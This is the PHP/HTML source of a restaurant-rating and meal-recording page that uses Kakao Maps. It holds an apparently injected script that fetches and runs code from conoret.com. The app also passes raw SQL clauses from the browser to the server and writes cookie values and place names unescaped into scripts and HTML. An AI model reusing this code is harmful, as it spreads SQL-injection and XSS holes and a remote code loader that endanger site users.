<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="https://getbootstrap.com/docs/4.0/assets/img/favicons/favicon.ico">

    <title>ssosso-table.food-db.record</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <!-- Favicons -->
    <link rel="apple-touch-icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
    <link rel="manifest" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/manifest.json">
    <link rel="mask-icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/safari-pinned-tab.svg" color="#7952b3">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon.ico">
    <meta name="theme-color" content="#7952b3">

    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->
    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">
    <link href="./css/main/cover.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/record.css">
    <style>
        @media screen and (max-resolution: 50dpi) {

            .card {
                width: 350px !important;
                margin: auto;
            }
            .list-group {
                width: 100%;
            }
            #map {
                width: 300px!important;
                height: 300px!important;
                left:50%!important;
                transform:translate(-50%, 0%)!important;
            }
            .rating-marker img {
                width: 10px!important;
                height: 20px!important;
            }
        }
        @media (max-width: 640px) {
            .card {
                width: 350px !important;
                margin: auto;
            }
            .list-group {
                width: 100%;
            }
            #map {
                width: 300px!important;
                height: 300px!important;
                left:50%!important;
                transform:translate(-50%, 0%)!important;
            }
            .rating-marker img {
                width: 10px!important;
                height: 20px!important;
            }
        }
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 640px) {
            .card {
                width: 350px !important;
                margin: auto;
            }
            .list-group {
                width: 100%;
            }
            #map {
                width: 300px!important;
                height: 300px!important;
                left:50%!important;
                transform:translate(-50%, 0%)!important;
            }
            .rating-marker img {
                width: 10px!important;
                height: 20px!important;
            }
        }
        .list-group-item.active {
            background-color:#e4bd74;
            color:white;
        }
        input.img-button {
            background: url( "src/food_placeholder.png" ) no-repeat;
            border: none;
            width: 32px;
            height: 32px;
            cursor: pointer;
        }

    </style>

    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
            src="https://code.jquery.com/jquery-3.6.0.min.js"
            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
            crossorigin="anonymous"></script>
    <script type="text/javascript">
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
        <div class="inner">
            <a href="http://ssossotable.com/rating.php"><h3 class="masthead-brand">소소식탁</h3></a>
            <nav class="nav nav-masthead justify-content-center">
                <a class="nav-link text-muted" href="http://ssossotable.com/rating.php">음식 평가하기</a>
                <a class="nav-link text-muted" href="http://ssossotable.com/insert.php">음식 추가하기</a>
                <a class="nav-link active" href="http://ssossotable.com/record.php">식사 기록하기</a>
                <div class="dropdown">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" style="border-color: transparent;background-color: transparent;"></button>
                    <ul class="dropdown-menu" style="">
                        <li><a class="dropdown-item" href="http://ssossotable.com/myInfo.php">내 정보</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/friends.php">친구 목록</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/diary.php">다이어리</a></li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>

    <main role="main" class="inner cover" id="rating_main"  style="">
        <div class="card">
            <div class="card-body" id="title">
                <h5 class="card-title">식사 입력</h5>
                <p class="card-text">오늘 당신의 식사를 기록 해 주세요.</p>
            </div>
            <div id="map" style="width:500px;height:400px;"></div>
            <script type="text/javascript" src="//dapi.kakao.com/v2/maps/sdk.js?appkey=a4b680f23e6397395260cfd7b38420b8&libraries=services,clusterer,drawing"></script>
            <script>
                let placeId=-1

                let userId=<?php echo $_COOKIE['user_id']?>

                let cok={}
                cok.before=null
                let beforeSearch={}
                beforeSearch.data=null
                // 마커를 클릭하면 장소명을 표출할 인포윈도우 입니다
                let infowindow = new kakao.maps.InfoWindow({zIndex:1});

                let mapContainer = document.getElementById('map'), // 지도를 표시할 div
                    mapOption = {
                        center: new kakao.maps.LatLng(37.566826, 126.9786567), // 지도의 중심좌표
                        level: 3 // 지도의 확대 레벨
                    };

                let markers=[]
                // 지도를 생성합니다
                let map = new kakao.maps.Map(mapContainer, mapOption);

                // 장소 검색 객체를 생성합니다
                let ps = new kakao.maps.services.Places();

                let selectedFriendId=-1



                function friend_selected() {
                    selectedFriendId=parseInt(arguments[0])
                    document.getElementById('record-friend').innerText=arguments[1]
                }

                // 키워드 검색 완료 시 호출되는 콜백함수 입니다
                function placesSearchCB (data, status, pagination) {
                    markers=[]
                    if (status === kakao.maps.services.Status.OK) {
                        if(markers.length!==0) {
                            for(let i=0; i < markers.length;i++) {
                                markers[i].setMap(null)
                            }
                        }
                        // 검색된 장소 위치를 기준으로 지도 범위를 재설정하기위해
                        // LatLngBounds 객체에 좌표를 추가합니다
                        let bounds = new kakao.maps.LatLngBounds();
                        let resultdiv=``
                        document.getElementById('search-result-list').innerHTML=``

                        for (var i=0; i<data.length; i++) {
                            resultdiv+=`
                            <li class="list-group-item" id='list-content-${data[i].id}' onclick="location_onclick(${data[i].id},${i},'${data[i].place_name}','${data[i].road_address_name}','${data[i].category_name}',${data[i].y},${data[i].x})">
                                <span>${data[i].place_name}</span>
                                <span>${data[i].road_address_name}</span>
                            </li>
                            `
                            let marker=new kakao.maps.Marker({position: new kakao.maps.LatLng(data[i].y, data[i].x)})
                            markers.push(marker)
                            displayMarker(data[i],marker);
                            bounds.extend(new kakao.maps.LatLng(data[i].y, data[i].x));
                        }

                        document.getElementById('search-result-list').innerHTML=resultdiv
                        // 검색된 장소 위치를 기준으로 지도 범위를 재설정합니다
                        map.setBounds(bounds);
                    }
                }

                async function location_onclick() {
                    let postJson={}
                    let friendInfo={}
                    placeId=parseInt(arguments[0])

                    postJson[0]=2
                    postJson[1]='*'
                    postJson[2]='record'
                    postJson[3]=`userid=${userId} and \`where\`=${parseInt(arguments[0])}`
                    let v=JSON.parse(await $.post("script/php/DAOHandler.php",postJson));

                    postJson={}
                    postJson[0]=2
                    postJson[1]='id,nickname'
                    postJson[2]='user'
                    postJson[3]=`user.id in ( select friendid from user, friend where user.id=friend.userid and user.id=${userId} )`
                    let friends=await $.post("script/php/DAOHandler.php",postJson);


                    let format=``
                    let ffmt=``

                    if(friends!=='null') {
                        friends=JSON.parse(friends)

                        for(let i=0;i<friends.length;i++) {
                            ffmt+=`
                                <li onclick="friend_selected(${friends[i][0]},'${friends[i][1]}')"><a class="dropdown-item" href="#">${friends[i][1]}</a></li>
                                `
                        }
                    }

                    if(cok.before===null) {
                        cok.before=`list-content-${arguments[0]}`
                        document.getElementById(`list-content-${arguments[0]}`).classList.add('active')
                    }
                    else {
                        document.getElementById(cok.before).classList.remove('active')
                        cok.before=`list-content-${arguments[0]}`
                        document.getElementById(`list-content-${arguments[0]}`).classList.add('active')
                    }
                    if(v.length===0) {
                        format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="src/food_placeholder.png" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${arguments[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${arguments[0]}" style=" margin: 0px !important; padding: 0px !important;" class="rating-marker">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(0,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(1,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[0]},'${arguments[3]}','${arguments[4]}','${arguments[2]}',${arguments[5]},${arguments[6]})">
                                    </div>
                                </div>
                                <div class="dropdown">
                                    <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                    </a>

                                    <ul class="dropdown-menu">
                                        ${ffmt}
                                    </ul>
                                </div>
                                `
                        infowindow.setContent(format);
                    }
                    else {
                        let f=``
                        switch (parseInt(v[0][1])) {
                            case 1:
                                f=getScore(0,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 2:
                                f=getScore(1,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 3:
                                f=getScore(2,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 4:
                                f=getScore(3,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 5:
                                f=getScore(4,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 6:
                                f=getScore(5,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 7:
                                f=getScore(6,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 8:
                                f=getScore(7,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 9:
                                f=getScore(8,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            case 10:
                                f=getScore(9,arguments[0],`${arguments[3]}`,`${arguments[4]}`,`${arguments[2]}`,arguments[5],arguments[6])
                                break
                            default :
                                break
                        }
                        format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="${v[0][9]}" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${arguments[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${arguments[0]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                    <div class="dropdown">
                                        <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                            누구와 먹었나요?
                                        </a>

                                        <ul class="dropdown-menu">
                                            ${ffmt}
                                        </ul>
                                    </div>
                                </div>
                                `
                        infowindow.setContent(format);
                    }
                    infowindow.open(map, markers[arguments[1]]);
                    const preview = document.getElementById("preview"),
                        fileElem = document.getElementById("fileElem");

                    preview.addEventListener("click", function (e) {
                        if (fileElem) {
                            fileElem.click();
                        }
                    }, false);
                }

                // 지도에 마커를 표시하는 함수입니다
                async function displayMarker(place,marker) {
                    // 마커를 생성하고 지도에 표시합니다
                    // var marker = new kakao.maps.Marker({
                    //     position: new kakao.maps.LatLng(place.y, place.x)
                    // });

                    marker.setMap(map)
                    // 마커에 클릭이벤트를 등록합니다
                    kakao.maps.event.addListener(marker, 'click', async function(event) {
                        // 마커를 클릭하면 장소명이 인포윈도우에 표출됩니다
                        let postJson={}
                        let friendInfo={}

                        postJson.userId=<?php echo $_COOKIE['user_id'];?>

                        friendInfo.userId=<?php echo $_COOKIE['user_id'];?>

                        placeId=parseInt(place.id)

                        postJson[0]=2
                        postJson[1]='*'
                        postJson[2]='record'
                        postJson[3]=`userid=${userId} and \`where\`=${parseInt(place.id)}`
                        let v=JSON.parse(await $.post("script/php/DAOHandler.php",postJson));

                        postJson={}
                        postJson[0]=2
                        postJson[1]='id,nickname'
                        postJson[2]='user'
                        postJson[3]=`user.id in ( select friendid from user, friend where user.id=friend.userid and user.id=${userId} )`
                        let friends=await $.post("script/php/DAOHandler.php",postJson);

                        let ffmt=``

                        if(friends!=='null') {
                            friends=JSON.parse(friends)

                            for(let i=0;i<friends.length;i++) {
                                ffmt+=`
                                <li onclick="friend_selected(${friends[i][0]},'${friends[i][1]}')"><a class="dropdown-item" href="#">${friends[i][1]}</a></li>
                                `
                            }
                        }

                        let format=``
                        if(v.length===0) {
                            format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="src/food_placeholder.png" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${place.place_name}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${place.id}" style=" margin: 0px !important; padding: 0px !important;">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(0,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(1,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})">
                                        <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${place.id},'${place.road_address_name}','${place.category_name}','${place.place_name}',${place.y},${place.x})">
                                    </div>
                                    <div class="dropdown">
                                      <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                      </a>

                                      <ul class="dropdown-menu">
                                        ${ffmt}
                                      </ul>
                                    </div>
                                </div>
                                `
                            infowindow.setContent(format);
                        }
                        else {
                            let f=``
                            switch (parseInt(v[0][1])) {
                                case 0:
                                    f=getScore(-1,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 1:
                                    f=getScore(0,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 2:
                                    f=getScore(1,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 3:
                                    f=getScore(2,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 4:
                                    f=getScore(3,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 5:
                                    f=getScore(4,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 6:
                                    f=getScore(5,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 7:
                                    f=getScore(6,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 8:
                                    f=getScore(7,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 9:
                                    f=getScore(8,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                case 10:
                                    f=getScore(9,place.id,`${place.road_address_name}`,`${place.category_name}`,`${place.place_name}`,place.y,place.x)
                                    break
                                default :
                                    break
                            }

                            format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <div id="preview"><img id="preview-img" src="${v[0][9]}" width="60px" height="60px"></div>
                                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                                    <span>${place.place_name}</span>
                                    <div class="d-flex justify-content-start fs-2" id="record-${place.id}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                    <div class="dropdown">
                                      <a class="btn btn-secondary dropdown-toggle" id="record-friend" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                        누구와 먹었나요?
                                      </a>

                                      <ul class="dropdown-menu">
                                        ${ffmt}
                                      </ul>
                                    </div>
                                </div>
                                `
                            infowindow.setContent(format);
                        }
                        infowindow.open(map, marker);
                        const preview = document.getElementById("preview"),
                            fileElem = document.getElementById("fileElem");

                        preview.addEventListener("click", function (e) {
                            if (fileElem) {
                                fileElem.click();
                            }
                        }, false);
                    });
                }
                async function set() {
                    let postJson={}
                    switch (parseInt(arguments[0])) {
                        case 0:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(0,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 1:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(1,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 2:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(2,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 3:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(3,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 4:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(4,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 5:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(5,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 6:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(6,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 7:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(7,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 8:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(8,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        case 9:
                            document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(9,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                            break
                        default:
                            break
                    }


                    postJson.userId=<?php echo $_COOKIE['user_id']?>

                    postJson.rating=parseInt(arguments[0])+1
                    postJson.id=arguments[1]
                    postJson.location=arguments[2]
                    postJson.category=arguments[3]
                    postJson.name=arguments[4]
                    postJson.y=arguments[5]
                    postJson.x=arguments[6]


                    postJson={}
                    postJson[0]=2
                    postJson[1]='*'
                    postJson[2]='record'
                    postJson[3]=`userid=${<?php echo $_COOKIE['user_id']?>} and \`where\`=${arguments[1]}`
                    let v=JSON.parse(await $.post("script/php/DAOHandler.php",postJson));

                    if(v.length===0) {
                        postJson={}
                        postJson[0]=1
                        postJson[1]='record(userid,rating,what,`where`,y,x,address,category)'
                        postJson[2]=`${userId},${parseInt(arguments[0])+1},'${arguments[4]}',${arguments[1]},${arguments[5]},${arguments[6]},'${arguments[2]}','${arguments[3]}'`
                        await $.post("script/php/DAOHandler.php",postJson)
                    }
                    else {
                        postJson={}
                        postJson[0]=3
                        postJson[1]='record'
                        postJson[2]=`rating=${parseInt(arguments[0])+1}`
                        postJson[3]=`userid=${<?php echo $_COOKIE['user_id']?>} and \`where\`=${arguments[1]}`
                        const v=await $.post("script/php/DAOHandler.php",postJson)
                    }
                }

                function search() {

                    // 키워드로 장소를 검색합니다
                    cok.before=null
                    const value=document.getElementById('where').value;
                    resultDiv=[]
                    document.getElementById('where').value=''
                    ps.keywordSearch(value, placesSearchCB);

                }
                function getScore() {
                    switch (parseInt(arguments[0])) {
                        case -1:
                            return `
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 0:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 1:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 2:
                            return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
